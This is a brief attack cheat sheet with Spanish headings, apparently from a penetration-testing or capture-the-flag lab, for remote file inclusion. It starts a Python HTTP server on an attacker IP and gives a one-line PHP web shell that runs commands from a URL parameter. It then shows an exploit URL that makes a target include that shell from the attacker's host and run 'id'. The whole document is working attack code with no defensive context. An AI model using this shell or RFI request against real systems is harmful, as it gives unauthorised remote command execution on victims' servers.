## Servidor WEB

```python
IP = 10.10.10.14

python3 -m http.server 8080
```

## shell.php

```python
<?php system($_GET['cmd']); ?>
```

## RFI

```python
http://10.10.10.26/index.php?language=http://10.10.10.14:8080/shell.php&cmd=id
```
